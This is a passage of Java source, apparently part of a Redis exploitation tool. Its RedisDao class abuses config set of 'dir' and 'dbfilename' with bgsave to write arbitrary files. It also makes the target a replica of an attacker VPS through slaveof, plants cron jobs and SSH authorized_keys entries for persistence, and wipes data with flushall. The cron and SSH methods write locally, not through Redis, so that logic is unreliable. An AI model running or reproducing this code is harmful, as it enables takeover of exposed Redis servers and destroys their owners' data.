    private static List<String> dir = new ArrayList<>();
    private static String slaveReadOnlyFlag = "yes";
    private static String ip;
    private static int port;
    private static String password;
    private static int timeout;

    public RedisDao(String ip, int port, String password, int timeout) {
        this.ip = ip;
        this.port = port;
        this.password = password;
        this.timeout = timeout;
    }

    public void testConnection() {
        Jedis tempConn = new Jedis(ip, port, timeout);
        try {
            if (password != null && !password.isEmpty()) {
                tempConn.auth(password);
            }
            tempConn.info();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            tempConn.close();
        }
    }

    public void getConnection() {
        CONN = new Jedis(ip, port, timeout);
        if (password != null && !password.isEmpty()) {
            CONN.auth(password);
        }
    }

    public void closeConnection() {
        if (CONN != null) {
            CONN.close();
        }
    }

    public void getInfo() {
        if (CONN != null) {
            System.out.println("Server Info: " + CONN.info());
            System.out.println("Directory Config: " + dir);
        }
    }

    public void redisavedb(String dir, String dbfilename) {
        this.dir.add(dir);
        CONN.configSet("dir", dir);
        CONN.configSet("dbfilename", dbfilename);
        CONN.bgsave();
    }

    public void redisslave(String vpsIp, String vpsPort) {
        CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));
        CONN.configSet("slave-read-only", slaveReadOnlyFlag);
    }

    public void crontab(String cronText) {
        String[] cronDirs = {"/etc/cron.d", "/var/spool/cron", "/usr/lib/systemd/system"};
        for (String cronDir : cronDirs) {
            File file = new File(cronDir, "redis_cron");
            try (FileWriter writer = new FileWriter(file)) {
                writer.write(cronText);
                writer.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public void sshkey(String sshRsa, String Path) {
        File file = new File(Path, ".ssh/authorized_keys");
        try (FileWriter writer = new FileWriter(file)) {
            writer.write(sshRsa);
            writer.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void clean() {
        if (CONN != null) {
            CONN.configResetStat();
            CONN.flushall();
        }
        dir.clear();
    }
}

